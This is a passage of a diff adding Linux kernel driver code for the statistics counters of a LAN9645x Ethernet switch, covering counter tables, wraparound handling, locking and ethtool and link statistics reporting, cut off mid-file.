-+	[SCNT_RX_PMAC_SZ_64]       = 0x39,
-+	[SCNT_RX_PMAC_SZ_65_127]   = 0x3a,
-+	[SCNT_RX_PMAC_SZ_128_255]  = 0x3b,
-+	[SCNT_RX_PMAC_SZ_256_511]  = 0x3c,
-+	[SCNT_RX_PMAC_SZ_512_1023] = 0x3d,
-+	[SCNT_RX_PMAC_SZ_1024_1526] = 0x3e,
-+	[SCNT_RX_PMAC_SZ_JUMBO]    = 0x3f,
-+	[SCNT_RX_PMAC_PAUSE]       = 0x40,
-+	[SCNT_RX_PMAC_CONTROL]     = 0x41,
-+	[SCNT_RX_PMAC_LONG]        = 0x42,
-+	[SCNT_TX_OCT]              = 0x80,
-+	[SCNT_TX_UC]               = 0x81,
-+	[SCNT_TX_MC]               = 0x82,
-+	[SCNT_TX_BC]               = 0x83,
-+	[SCNT_TX_COL]              = 0x84,
-+	[SCNT_TX_DROP]             = 0x85,
-+	[SCNT_TX_PAUSE]            = 0x86,
-+	[SCNT_TX_SZ_64]            = 0x87,
-+	[SCNT_TX_SZ_65_127]        = 0x88,
-+	[SCNT_TX_SZ_128_255]       = 0x89,
-+	[SCNT_TX_SZ_256_511]       = 0x8a,
-+	[SCNT_TX_SZ_512_1023]      = 0x8b,
-+	[SCNT_TX_SZ_1024_1526]     = 0x8c,
-+	[SCNT_TX_SZ_JUMBO]         = 0x8d,
-+	[SCNT_TX_YELLOW_PRIO_0]    = 0x8e,
-+	[SCNT_TX_YELLOW_PRIO_1]    = 0x8f,
-+	[SCNT_TX_YELLOW_PRIO_2]    = 0x90,
-+	[SCNT_TX_YELLOW_PRIO_3]    = 0x91,
-+	[SCNT_TX_YELLOW_PRIO_4]    = 0x92,
-+	[SCNT_TX_YELLOW_PRIO_5]    = 0x93,
-+	[SCNT_TX_YELLOW_PRIO_6]    = 0x94,
-+	[SCNT_TX_YELLOW_PRIO_7]    = 0x95,
-+	[SCNT_TX_GREEN_PRIO_0]     = 0x96,
-+	[SCNT_TX_GREEN_PRIO_1]     = 0x97,
-+	[SCNT_TX_GREEN_PRIO_2]     = 0x98,
-+	[SCNT_TX_GREEN_PRIO_3]     = 0x99,
-+	[SCNT_TX_GREEN_PRIO_4]     = 0x9a,
-+	[SCNT_TX_GREEN_PRIO_5]     = 0x9b,
-+	[SCNT_TX_GREEN_PRIO_6]     = 0x9c,
-+	[SCNT_TX_GREEN_PRIO_7]     = 0x9d,
-+	[SCNT_TX_AGED]             = 0x9e,
-+	[SCNT_TX_LLCT]             = 0x9f,
-+	[SCNT_TX_CT]               = 0xa0,
-+	[SCNT_TX_BUFDROP]          = 0xa1,
-+	[SCNT_TX_MM_HOLD]          = 0xa2,
-+	[SCNT_TX_MERGE_FRAG]       = 0xa3,
-+	[SCNT_TX_PMAC_OCT]         = 0xa4,
-+	[SCNT_TX_PMAC_UC]          = 0xa5,
-+	[SCNT_TX_PMAC_MC]          = 0xa6,
-+	[SCNT_TX_PMAC_BC]          = 0xa7,
-+	[SCNT_TX_PMAC_PAUSE]       = 0xa8,
-+	[SCNT_TX_PMAC_SZ_64]       = 0xa9,
-+	[SCNT_TX_PMAC_SZ_65_127]   = 0xaa,
-+	[SCNT_TX_PMAC_SZ_128_255]  = 0xab,
-+	[SCNT_TX_PMAC_SZ_256_511]  = 0xac,
-+	[SCNT_TX_PMAC_SZ_512_1023] = 0xad,
-+	[SCNT_TX_PMAC_SZ_1024_1526] = 0xae,
-+	[SCNT_TX_PMAC_SZ_JUMBO]    = 0xaf,
-+	[SCNT_DR_LOCAL]            = 0x100,
-+	[SCNT_DR_TAIL]             = 0x101,
-+	[SCNT_DR_YELLOW_PRIO_0]    = 0x102,
-+	[SCNT_DR_YELLOW_PRIO_1]    = 0x103,
-+	[SCNT_DR_YELLOW_PRIO_2]    = 0x104,
-+	[SCNT_DR_YELLOW_PRIO_3]    = 0x105,
-+	[SCNT_DR_YELLOW_PRIO_4]    = 0x106,
-+	[SCNT_DR_YELLOW_PRIO_5]    = 0x107,
-+	[SCNT_DR_YELLOW_PRIO_6]    = 0x108,
-+	[SCNT_DR_YELLOW_PRIO_7]    = 0x109,
-+	[SCNT_DR_GREEN_PRIO_0]     = 0x10a,
-+	[SCNT_DR_GREEN_PRIO_1]     = 0x10b,
-+	[SCNT_DR_GREEN_PRIO_2]     = 0x10c,
-+	[SCNT_DR_GREEN_PRIO_3]     = 0x10d,
-+	[SCNT_DR_GREEN_PRIO_4]     = 0x10e,
-+	[SCNT_DR_GREEN_PRIO_5]     = 0x10f,
-+	[SCNT_DR_GREEN_PRIO_6]     = 0x110,
-+	[SCNT_DR_GREEN_PRIO_7]     = 0x111,
-+};
-+
-+struct lan9645x_ethtool_stat {
-+	char name[ETH_GSTRING_LEN];
-+	u16 idx;
-+};
-+
-+static const struct lan9645x_ethtool_stat lan9645x_port_ethtool_stats[] = {
-+	{ "rx_cat_drop",        SCNT_RX_CAT_DROP },
-+	{ "rx_red_prio_0",      SCNT_RX_RED_PRIO_0 },
-+	{ "rx_red_prio_1",      SCNT_RX_RED_PRIO_1 },
-+	{ "rx_red_prio_2",      SCNT_RX_RED_PRIO_2 },
-+	{ "rx_red_prio_3",      SCNT_RX_RED_PRIO_3 },
-+	{ "rx_red_prio_4",      SCNT_RX_RED_PRIO_4 },
-+	{ "rx_red_prio_5",      SCNT_RX_RED_PRIO_5 },
-+	{ "rx_red_prio_6",      SCNT_RX_RED_PRIO_6 },
-+	{ "rx_red_prio_7",      SCNT_RX_RED_PRIO_7 },
-+	{ "rx_yellow_prio_0",   SCNT_RX_YELLOW_PRIO_0 },
-+	{ "rx_yellow_prio_1",   SCNT_RX_YELLOW_PRIO_1 },
-+	{ "rx_yellow_prio_2",   SCNT_RX_YELLOW_PRIO_2 },
-+	{ "rx_yellow_prio_3",   SCNT_RX_YELLOW_PRIO_3 },
-+	{ "rx_yellow_prio_4",   SCNT_RX_YELLOW_PRIO_4 },
-+	{ "rx_yellow_prio_5",   SCNT_RX_YELLOW_PRIO_5 },
-+	{ "rx_yellow_prio_6",   SCNT_RX_YELLOW_PRIO_6 },
-+	{ "rx_yellow_prio_7",   SCNT_RX_YELLOW_PRIO_7 },
-+	{ "rx_green_prio_0",    SCNT_RX_GREEN_PRIO_0 },
-+	{ "rx_green_prio_1",    SCNT_RX_GREEN_PRIO_1 },
-+	{ "rx_green_prio_2",    SCNT_RX_GREEN_PRIO_2 },
-+	{ "rx_green_prio_3",    SCNT_RX_GREEN_PRIO_3 },
-+	{ "rx_green_prio_4",    SCNT_RX_GREEN_PRIO_4 },
-+	{ "rx_green_prio_5",    SCNT_RX_GREEN_PRIO_5 },
-+	{ "rx_green_prio_6",    SCNT_RX_GREEN_PRIO_6 },
-+	{ "rx_green_prio_7",    SCNT_RX_GREEN_PRIO_7 },
-+	{ "tx_drop",            SCNT_TX_DROP },
-+	{ "tx_yellow_prio_0",   SCNT_TX_YELLOW_PRIO_0 },
-+	{ "tx_yellow_prio_1",   SCNT_TX_YELLOW_PRIO_1 },
-+	{ "tx_yellow_prio_2",   SCNT_TX_YELLOW_PRIO_2 },
-+	{ "tx_yellow_prio_3",   SCNT_TX_YELLOW_PRIO_3 },
-+	{ "tx_yellow_prio_4",   SCNT_TX_YELLOW_PRIO_4 },
-+	{ "tx_yellow_prio_5",   SCNT_TX_YELLOW_PRIO_5 },
-+	{ "tx_yellow_prio_6",   SCNT_TX_YELLOW_PRIO_6 },
-+	{ "tx_yellow_prio_7",   SCNT_TX_YELLOW_PRIO_7 },
-+	{ "tx_green_prio_0",    SCNT_TX_GREEN_PRIO_0 },
-+	{ "tx_green_prio_1",    SCNT_TX_GREEN_PRIO_1 },
-+	{ "tx_green_prio_2",    SCNT_TX_GREEN_PRIO_2 },
-+	{ "tx_green_prio_3",    SCNT_TX_GREEN_PRIO_3 },
-+	{ "tx_green_prio_4",    SCNT_TX_GREEN_PRIO_4 },
-+	{ "tx_green_prio_5",    SCNT_TX_GREEN_PRIO_5 },
-+	{ "tx_green_prio_6",    SCNT_TX_GREEN_PRIO_6 },
-+	{ "tx_green_prio_7",    SCNT_TX_GREEN_PRIO_7 },
-+	{ "tx_aged",            SCNT_TX_AGED },
-+	{ "tx_bufdrop",         SCNT_TX_BUFDROP },
-+	{ "dr_local",           SCNT_DR_LOCAL },
-+	{ "dr_yellow_prio_0",   SCNT_DR_YELLOW_PRIO_0 },
-+	{ "dr_yellow_prio_1",   SCNT_DR_YELLOW_PRIO_1 },
-+	{ "dr_yellow_prio_2",   SCNT_DR_YELLOW_PRIO_2 },
-+	{ "dr_yellow_prio_3",   SCNT_DR_YELLOW_PRIO_3 },
-+	{ "dr_yellow_prio_4",   SCNT_DR_YELLOW_PRIO_4 },
-+	{ "dr_yellow_prio_5",   SCNT_DR_YELLOW_PRIO_5 },
-+	{ "dr_yellow_prio_6",   SCNT_DR_YELLOW_PRIO_6 },
-+	{ "dr_yellow_prio_7",   SCNT_DR_YELLOW_PRIO_7 },
-+	{ "dr_green_prio_0",    SCNT_DR_GREEN_PRIO_0 },
-+	{ "dr_green_prio_1",    SCNT_DR_GREEN_PRIO_1 },
-+	{ "dr_green_prio_2",    SCNT_DR_GREEN_PRIO_2 },
-+	{ "dr_green_prio_3",    SCNT_DR_GREEN_PRIO_3 },
-+	{ "dr_green_prio_4",    SCNT_DR_GREEN_PRIO_4 },
-+	{ "dr_green_prio_5",    SCNT_DR_GREEN_PRIO_5 },
-+	{ "dr_green_prio_6",    SCNT_DR_GREEN_PRIO_6 },
-+	{ "dr_green_prio_7",    SCNT_DR_GREEN_PRIO_7 },
-+};
-+
-+static const struct lan9645x_view_stats lan9645x_view_stat_cfgs[] = {
-+	[LAN9645X_STAT_PORTS] = {
-+		.layout = lan9645x_port_stats_layout,
-+		.num_cnts = ARRAY_SIZE(lan9645x_port_stats_layout),
-+		.num_indexes = NUM_PHYS_PORTS,
-+	},
-+};
-+
-+static_assert(ARRAY_SIZE(lan9645x_view_stat_cfgs) == LAN9645X_STAT_NUM);
-+
-+static struct lan9645x_view_stats *
-+lan9645x_get_vstats(struct lan9645x *lan9645x,
-+		    enum lan9645x_view_stat_type type)
-+{
-+	return &lan9645x->stats->view[type];
-+}
-+
-+static u64 *lan9645x_stats_index(struct lan9645x_view_stats *vstats, int idx)
-+{
-+	return &vstats->cnts[vstats->num_cnts * idx];
-+}
-+
-+static u64 *lan9645x_stat_counters(struct lan9645x *lan9645x,
-+				   enum lan9645x_view_stat_type type, int idx)
-+{
-+	return lan9645x_stats_index(lan9645x_get_vstats(lan9645x, type), idx);
-+}
-+
-+/* Update a 64 bit software counter from a wrapping 32 bit hardware counter.
-+ * The low half is replaced, not accumulated, so both must start from the same
-+ * baseline. lan9645x_stats_init() clears hardware and software together.
-+ */
-+static void lan9645x_stats_update_counter(u64 *sw, u32 hw)
-+{
-+	if (hw < (*sw & U32_MAX))
-+		*sw += (u64)1 << 32; /* value has wrapped */
-+
-+	*sw = (*sw & ~(u64)U32_MAX) + hw;
-+}
-+
-+static int __lan9645x_stats_view_idx_hw_read(struct lan9645x *lan9645x,
-+					     enum lan9645x_view_stat_type vtype,
-+					     int idx)
-+{
-+	struct lan9645x_stat_region region;
-+	struct lan9645x_view_stats *vstats;
-+	int err;
-+
-+	lockdep_assert_held(&lan9645x->stats->hw_lock);
-+
-+	vstats = lan9645x_get_vstats(lan9645x, vtype);
-+	if (idx < 0 || idx >= vstats->num_indexes)
-+		return -EINVAL;
-+
-+	lan_wr(SYS_STAT_CFG_STAT_VIEW_SET(idx), lan9645x, SYS_STAT_CFG);
-+
-+	/* Each region for this index contains counters which are at sequential
-+	 * addresses, so we can use bulk reads to ease lock pressure a bit.
-+	 */
-+	for (int r = 0; r < vstats->num_regions; r++) {
-+		region = vstats->regions[r];
-+		err = lan_bulk_rd(&vstats->buf[region.cnts_base_idx],
-+				  region.cnt, lan9645x,
-+				  SYS_CNT(region.base_offset));
-+		if (err) {
-+			dev_err_ratelimited(lan9645x->dev,
-+					    "stats bulk read err vtype=%d idx=%d err=%d\n",
-+					    vtype, idx, err);
-+			return err;
-+		}
-+	}
-+
-+	return 0;
-+}
-+
-+static void
-+__lan9645x_stats_view_idx_transfer(struct lan9645x *lan9645x,
-+				   enum lan9645x_view_stat_type vtype, int idx)
-+{
-+	struct lan9645x_view_stats *vstats;
-+	u64 *idx_counters;
-+	int cntr;
-+
-+	lockdep_assert_held(&lan9645x->stats->sw_lock);
-+
-+	vstats = lan9645x_get_vstats(lan9645x, vtype);
-+	if (idx < 0 || idx >= vstats->num_indexes)
-+		return;
-+
-+	idx_counters = lan9645x_stats_index(vstats, idx);
-+
-+	for (cntr = 0; cntr < vstats->num_cnts; cntr++)
-+		lan9645x_stats_update_counter(&idx_counters[cntr],
-+					      vstats->buf[cntr]);
-+}
-+
-+static void __lan9645x_stats_view_idx_update(struct lan9645x *lan9645x,
-+					     enum lan9645x_view_stat_type vtype,
-+					     int idx)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+
-+	lockdep_assert_held(&s->hw_lock);
-+
-+	if (!__lan9645x_stats_view_idx_hw_read(lan9645x, vtype, idx)) {
-+		spin_lock(&s->sw_lock);
-+		__lan9645x_stats_view_idx_transfer(lan9645x, vtype, idx);
-+		spin_unlock(&s->sw_lock);
-+	}
-+}
-+
-+static u64 *lan9645x_stats_view_idx_update(struct lan9645x *lan9645x,
-+					   enum lan9645x_view_stat_type vtype,
-+					   int idx)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+
-+	mutex_lock(&s->hw_lock);
-+	__lan9645x_stats_view_idx_update(lan9645x, vtype, idx);
-+	mutex_unlock(&s->hw_lock);
-+
-+	return lan9645x_stat_counters(lan9645x, vtype, idx);
-+}
-+
-+static void lan9645x_stats_view_update(struct lan9645x *lan9645x,
-+				       enum lan9645x_view_stat_type vtype)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	struct lan9645x_view_stats *vstats;
-+	int idx;
-+
-+	vstats = lan9645x_get_vstats(lan9645x, vtype);
-+
-+	switch (vtype) {
-+	case LAN9645X_STAT_PORTS:
-+		mutex_lock(&s->hw_lock);
-+		for (idx = 0; idx < vstats->num_indexes; idx++) {
-+			if (dsa_is_unused_port(lan9645x->ds, idx))
-+				continue;
-+			__lan9645x_stats_view_idx_update(lan9645x, vtype, idx);
-+		}
-+		mutex_unlock(&s->hw_lock);
-+		return;
-+	default:
-+		return;
-+	}
-+}
-+
-+static void lan9645x_stats_update(struct lan9645x *lan9645x)
-+{
-+	for (int vtype = 0; vtype < LAN9645X_STAT_NUM; vtype++)
-+		lan9645x_stats_view_update(lan9645x, vtype);
-+}
-+
-+void lan9645x_stats_get_strings(struct lan9645x *lan9645x, int port,
-+				u32 stringset, u8 *data)
-+{
-+	int i;
-+
-+	if (stringset != ETH_SS_STATS)
-+		return;
-+
-+	for (i = 0; i < ARRAY_SIZE(lan9645x_port_ethtool_stats); i++)
-+		ethtool_puts(&data, lan9645x_port_ethtool_stats[i].name);
-+}
-+
-+int lan9645x_stats_get_sset_count(struct lan9645x *lan9645x, int port, int sset)
-+{
-+	if (sset != ETH_SS_STATS)
-+		return -EOPNOTSUPP;
-+
-+	return ARRAY_SIZE(lan9645x_port_ethtool_stats);
-+}
-+
-+void lan9645x_stats_get_ethtool_stats(struct lan9645x *lan9645x, int port,
-+				      u64 *data)
-+{
-+	struct lan9645x_stats *stats = lan9645x->stats;
-+	u64 *c;
-+	int i;
-+
-+	c = lan9645x_stats_view_idx_update(lan9645x, LAN9645X_STAT_PORTS, port);
-+
-+	spin_lock(&stats->sw_lock);
-+	for (i = 0; i < ARRAY_SIZE(lan9645x_port_ethtool_stats); i++)
-+		*data++ = c[lan9645x_port_ethtool_stats[i].idx];
-+	spin_unlock(&stats->sw_lock);
-+}
-+
-+static u64 *lan9645x_stats_port_update(struct lan9645x *lan9645x, int port)
-+{
-+	return lan9645x_stats_view_idx_update(lan9645x, LAN9645X_STAT_PORTS,
-+					      port);
-+}
-+
-+void lan9645x_stats_get_eth_mac_stats(struct lan9645x *lan9645x, int port,
-+				      struct ethtool_eth_mac_stats *m)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	u64 *c;
-+
-+	c = lan9645x_stats_port_update(lan9645x, port);
-+
-+	spin_lock(&s->sw_lock);
-+
-+	m->FramesTransmittedOK = c[SCNT_TX_UC] +
-+				 c[SCNT_TX_MC] +
-+				 c[SCNT_TX_BC] +
-+				 c[SCNT_TX_PMAC_UC] +
-+				 c[SCNT_TX_PMAC_MC] +
-+				 c[SCNT_TX_PMAC_BC];
-+	m->FramesReceivedOK = c[SCNT_RX_UC] +
-+			      c[SCNT_RX_MC] +
-+			      c[SCNT_RX_BC] +
-+			      c[SCNT_RX_PMAC_UC] +
-+			      c[SCNT_RX_PMAC_MC] +
-+			      c[SCNT_RX_PMAC_BC];
-+	m->FrameCheckSequenceErrors = c[SCNT_RX_CRC] +
-+				      c[SCNT_RX_PMAC_CRC];
-+	m->OctetsTransmittedOK = c[SCNT_TX_OCT] +
-+				 c[SCNT_TX_PMAC_OCT];
-+	m->OctetsReceivedOK = c[SCNT_RX_OCT] +
-+			      c[SCNT_RX_PMAC_OCT];
-+	m->MulticastFramesXmittedOK = c[SCNT_TX_MC] +
-+				      c[SCNT_TX_PMAC_MC];
-+	m->BroadcastFramesXmittedOK = c[SCNT_TX_BC] +
-+				      c[SCNT_TX_PMAC_BC];
-+	m->MulticastFramesReceivedOK = c[SCNT_RX_MC] +
-+				       c[SCNT_RX_PMAC_MC];
-+	m->BroadcastFramesReceivedOK = c[SCNT_RX_BC] +
-+				       c[SCNT_RX_PMAC_BC];
-+	m->FrameTooLongErrors = c[SCNT_RX_JABBER] +
-+				c[SCNT_RX_LONG] +
-+				c[SCNT_RX_PMAC_JABBER] +
-+				c[SCNT_RX_PMAC_LONG];
-+
-+	spin_unlock(&s->sw_lock);
-+}
-+
-+static const struct ethtool_rmon_hist_range lan9645x_rmon_ranges[] = {
-+	{   64,     64 },
-+	{   65,    127 },
-+	{  128,    255 },
-+	{  256,    511 },
-+	{  512,   1023 },
-+	{ 1024,   1526 },
-+	{ 1527, 0xffff },
-+	{}
-+};
-+
-+void
-+lan9645x_stats_get_rmon_stats(struct lan9645x *lan9645x, int port,
-+			      struct ethtool_rmon_stats *r,
-+			      const struct ethtool_rmon_hist_range **ranges)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	u64 *c;
-+
-+	c = lan9645x_stats_port_update(lan9645x, port);
-+
-+	spin_lock(&s->sw_lock);
-+
-+	r->undersize_pkts = c[SCNT_RX_SHORT] +
-+			    c[SCNT_RX_PMAC_SHORT];
-+	r->oversize_pkts = c[SCNT_RX_LONG] +
-+			   c[SCNT_RX_PMAC_LONG];
-+	/* SCNT_RX_FRAG counts frames received after the port is paused, and
-+	 * increments when pause frames arrive from the link partner.
-+	 * It counts neither undersize frames nor errors, so it is left out here
-+	 * and out of rx_packets, unlike lan966x which adds it to rx_errors.
-+	 * SCNT_RX_PMAC_FRAG does count number of runt frames with invalid CRC.
-+	 */
-+	r->fragments = c[SCNT_RX_PMAC_FRAG];
-+	r->jabbers = c[SCNT_RX_JABBER] +
-+		     c[SCNT_RX_PMAC_JABBER];
-+	r->hist[0] = c[SCNT_RX_SZ_64] +
-+		     c[SCNT_RX_PMAC_SZ_64];
-+	r->hist[1] = c[SCNT_RX_SZ_65_127] +
-+		     c[SCNT_RX_PMAC_SZ_65_127];
-+	r->hist[2] = c[SCNT_RX_SZ_128_255] +
-+		     c[SCNT_RX_PMAC_SZ_128_255];
-+	r->hist[3] = c[SCNT_RX_SZ_256_511] +
-+		     c[SCNT_RX_PMAC_SZ_256_511];
-+	r->hist[4] = c[SCNT_RX_SZ_512_1023] +
-+		     c[SCNT_RX_PMAC_SZ_512_1023];
-+	r->hist[5] = c[SCNT_RX_SZ_1024_1526] +
-+		     c[SCNT_RX_PMAC_SZ_1024_1526];
-+	r->hist[6] = c[SCNT_RX_SZ_JUMBO] +
-+		     c[SCNT_RX_PMAC_SZ_JUMBO];
-+	r->hist_tx[0] = c[SCNT_TX_SZ_64] +
-+			c[SCNT_TX_PMAC_SZ_64];
-+	r->hist_tx[1] = c[SCNT_TX_SZ_65_127] +
-+			c[SCNT_TX_PMAC_SZ_65_127];
-+	r->hist_tx[2] = c[SCNT_TX_SZ_128_255] +
-+			c[SCNT_TX_PMAC_SZ_128_255];
-+	r->hist_tx[3] = c[SCNT_TX_SZ_256_511] +
-+			c[SCNT_TX_PMAC_SZ_256_511];
-+	r->hist_tx[4] = c[SCNT_TX_SZ_512_1023] +
-+			c[SCNT_TX_PMAC_SZ_512_1023];
-+	r->hist_tx[5] = c[SCNT_TX_SZ_1024_1526] +
-+			c[SCNT_TX_PMAC_SZ_1024_1526];
-+	r->hist_tx[6] = c[SCNT_TX_SZ_JUMBO] +
-+			c[SCNT_TX_PMAC_SZ_JUMBO];
-+
-+	spin_unlock(&s->sw_lock);
-+
-+	*ranges = lan9645x_rmon_ranges;
-+}
-+
-+void lan9645x_stats_get_stats64(struct lan9645x *lan9645x, int port,
-+				struct rtnl_link_stats64 *stats)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	u64 *c;
-+
-+	c = lan9645x_stat_counters(lan9645x, LAN9645X_STAT_PORTS, port);
-+
-+	/* ndo_get_stats64 may run in non-sleepable context (under
-+	 * rcu_read_lock, or with a callers spinlock held as in bonding), so
-+	 * unlike the ethtool paths we must not take the hw_lock mutex or touch
-+	 * hardware here.
-+	 * sw_lock is never taken from softirq/IRQ context by any path, so a
-+	 * plain spin_lock is sufficient, as in ocelot and ksz.
-+	 */
-+	spin_lock(&s->sw_lock);
-+
-+	stats->rx_bytes = c[SCNT_RX_OCT] + c[SCNT_RX_PMAC_OCT];
-+
-+	stats->rx_packets = c[SCNT_RX_SHORT] +
-+			    c[SCNT_RX_JABBER] +
-+			    c[SCNT_RX_SZ_64] +
-+			    c[SCNT_RX_SZ_65_127] +
-+			    c[SCNT_RX_SZ_128_255] +
-+			    c[SCNT_RX_SZ_256_511] +
-+			    c[SCNT_RX_SZ_512_1023] +
-+			    c[SCNT_RX_SZ_1024_1526] +
-+			    c[SCNT_RX_SZ_JUMBO] +
-+			    c[SCNT_RX_LONG] +
-+			    c[SCNT_RX_PMAC_SHORT] +
-+			    c[SCNT_RX_PMAC_FRAG] +
-+			    c[SCNT_RX_PMAC_JABBER] +
-+			    c[SCNT_RX_PMAC_SZ_64] +
-+			    c[SCNT_RX_PMAC_SZ_65_127] +
-+			    c[SCNT_RX_PMAC_SZ_128_255] +
-+			    c[SCNT_RX_PMAC_SZ_256_511] +
-+			    c[SCNT_RX_PMAC_SZ_512_1023] +
-+			    c[SCNT_RX_PMAC_SZ_1024_1526] +
-+			    c[SCNT_RX_PMAC_SZ_JUMBO] +
-+			    c[SCNT_RX_PMAC_LONG];
-+
-+	stats->multicast = c[SCNT_RX_MC] + c[SCNT_RX_PMAC_MC];
-+
-+	stats->rx_errors = c[SCNT_RX_SHORT] +
-+			   c[SCNT_RX_JABBER] +
-+			   c[SCNT_RX_CRC] +
-+			   c[SCNT_RX_LONG] +
-+			   c[SCNT_RX_PMAC_SHORT] +
-+			   c[SCNT_RX_PMAC_JABBER] +
-+			   c[SCNT_RX_PMAC_CRC] +
-+			   c[SCNT_RX_PMAC_LONG];
-+
-+	stats->rx_length_errors = c[SCNT_RX_JABBER] +
-+				  c[SCNT_RX_LONG] +
-+				  c[SCNT_RX_PMAC_JABBER] +
-+				  c[SCNT_RX_PMAC_LONG];
-+
-+	/* SCNT_RX_CRC counts CRC errors, alignment errors and RX_ER events at
-+	 * any frame size, so a short frame with a bad CRC is counted here.
-+	 */
-+	stats->rx_crc_errors = c[SCNT_RX_CRC] + c[SCNT_RX_PMAC_CRC];
-+
-+	stats->rx_missed_errors = c[SCNT_DR_TAIL];
-+
-+	stats->rx_dropped = c[SCNT_DR_LOCAL];
-+
-+	for (int i = 0; i < NUM_PRIO_QUEUES; i++) {
-+		stats->rx_dropped += c[SCNT_RX_RED_PRIO_0 + i] +
-+				     c[SCNT_DR_YELLOW_PRIO_0 + i] +
-+				     c[SCNT_DR_GREEN_PRIO_0 + i];
-+	}
-+
-+	stats->tx_bytes = c[SCNT_TX_OCT] + c[SCNT_TX_PMAC_OCT];
-+
-+	stats->tx_packets = c[SCNT_TX_SZ_64] +
-+			    c[SCNT_TX_SZ_65_127] +
-+			    c[SCNT_TX_SZ_128_255] +
-+			    c[SCNT_TX_SZ_256_511] +
-+			    c[SCNT_TX_SZ_512_1023] +
-+			    c[SCNT_TX_SZ_1024_1526] +
-+			    c[SCNT_TX_SZ_JUMBO] +
-+			    c[SCNT_TX_PMAC_SZ_64] +
-+			    c[SCNT_TX_PMAC_SZ_65_127] +
-+			    c[SCNT_TX_PMAC_SZ_128_255] +
-+			    c[SCNT_TX_PMAC_SZ_256_511] +
-+			    c[SCNT_TX_PMAC_SZ_512_1023] +
-+			    c[SCNT_TX_PMAC_SZ_1024_1526] +
-+			    c[SCNT_TX_PMAC_SZ_JUMBO];
-+
-+	stats->tx_dropped = c[SCNT_TX_DROP] +
-+			    c[SCNT_TX_AGED] +
-+			    c[SCNT_TX_BUFDROP];
-+
-+	stats->collisions = c[SCNT_TX_COL];
-+
-+	spin_unlock(&s->sw_lock);
-+}
-+
-+void lan9645x_stats_get_eth_phy_stats(struct lan9645x *lan9645x, int port,
-+				      struct ethtool_eth_phy_stats *p)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	u64 *c;
-+
-+	c = lan9645x_stats_port_update(lan9645x, port);
-+
-+	spin_lock(&s->sw_lock);
-+
-+	p->SymbolErrorDuringCarrier = c[SCNT_RX_SYMBOL_ERR] +
-+				      c[SCNT_RX_PMAC_SYMBOL_ERR];
-+
-+	spin_unlock(&s->sw_lock);
-+}
-+
-+void
-+lan9645x_stats_get_eth_ctrl_stats(struct lan9645x *lan9645x, int port,
-+				  struct ethtool_eth_ctrl_stats *ctrl)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	u64 *c;
-+
-+	c = lan9645x_stats_port_update(lan9645x, port);
-+
-+	spin_lock(&s->sw_lock);
-+
-+	ctrl->MACControlFramesReceived = c[SCNT_RX_CONTROL] +
-+					 c[SCNT_RX_PMAC_CONTROL];
-+
-+	spin_unlock(&s->sw_lock);
-+}
-+
-+void lan9645x_stats_get_pause_stats(struct lan9645x *lan9645x, int port,
-+				    struct ethtool_pause_stats *ps)
-+{
-+	struct lan9645x_stats *s = lan9645x->stats;
-+	u64 *c;
-+
-+	c = lan9645x_stats_port_update(lan9645x, port);
-+
-+	spin_lock(&s->sw_lock);
-+
-+	ps->tx_pause_frames = c[SCNT_TX_PAUSE] + c[SCNT_TX_PMAC_PAUSE];
-+	ps->rx_pause_frames = c[SCNT_RX_PAUSE] + c[SCNT_RX_PMAC_PAUSE];
-+
-+	spin_unlock(&s->sw_lock);
-+}
-+
-+static void lan9645x_check_stats_work(struct work_struct *work)
-+{
-+	struct delayed_work *del_work = to_delayed_work(work);
-+	struct lan9645x_stats *stats;
-+
-+	stats = container_of(del_work, struct lan9645x_stats, work);
-+
-+	lan9645x_stats_update(stats->lan9645x);
-+
-+	queue_delayed_work(stats->queue, &stats->work,
-+			   LAN9645X_STATS_CHECK_DELAY);
-+}
-+
-+static int lan9645x_stats_prepare_regions(struct lan9645x *lan9645x,
-+					  struct lan9645x_view_stats *vstat)
-+{
-+	struct lan9645x_stat_region *regions;
-+	const u32 *layout = vstat->layout;
-+	size_t num_regions = 1;
-+	size_t r;
-+	int i;
-+
-+	for (i = 1; i < vstat->num_cnts; i++)
-+		if (layout[i] != layout[i - 1] + 1)
-+			num_regions++;
-+
-+	regions = devm_kcalloc(lan9645x->dev, num_regions, sizeof(*regions),
-+			       GFP_KERNEL);
-+	if (!regions)
-+		return -ENOMEM;
-+
-+	vstat->num_regions = num_regions;
-+	vstat->regions = regions;
-+
-+	regions[0].base_offset = layout[0];
-+	regions[0].cnts_base_idx = 0;
-+	regions[0].cnt = 1;
-+
-+	for (i = 1, r = 0; i < vstat->num_cnts; i++) {
-+		if (layout[i] != layout[i - 1] + 1) {
-+			r++;
-+			regions[r].base_offset = layout[i];
-+			regions[r].cnts_base_idx = i;
-+			regions[r].cnt = 1;
-+		} else {
-+			regions[r].cnt++;
-+		}
-+	}
-+
-+	return 0;
-+}
-+
-+static int lan9645x_view_stat_init(struct lan9645x *lan9645x,
-+				   struct lan9645x_view_stats *vstat,
-+				   const struct lan9645x_view_stats *cfg)
-+{
-+	size_t total = cfg->num_cnts * cfg->num_indexes;
-+	int err;
-+
-+	memcpy(vstat, cfg, sizeof(*cfg));
-+
-+	vstat->cnts = devm_kcalloc(lan9645x->dev, total, sizeof(u64),
-+				   GFP_KERNEL);
-+	if (!vstat->cnts)
-+		return -ENOMEM;
-+
-+	/* Scratch for one index at a time. hw_lock is held across the bulk
-+	 * read and the transfer into cnts, so no slot outlives an iteration.
-+	 */
-+	vstat->buf = devm_kcalloc(lan9645x->dev, cfg->num_cnts, sizeof(u32),
-+				  GFP_KERNEL);
-+	if (!vstat->buf)
-+		return -ENOMEM;
-+
-+	err = lan9645x_stats_prepare_regions(lan9645x, vstat);
-+	if (err)
-+		return err;
-+
-+	return 0;
-+}
-+
-+int lan9645x_stats_alloc(struct lan9645x *lan9645x)
-+{
-+	struct lan9645x_stats *stats;
-+	int err;
-+
-+	lan9645x->stats = devm_kzalloc(lan9645x->dev, sizeof(*stats),
-+				       GFP_KERNEL);
-+	if (!lan9645x->stats)
-+		return -ENOMEM;
-+
-+	stats = lan9645x->stats;
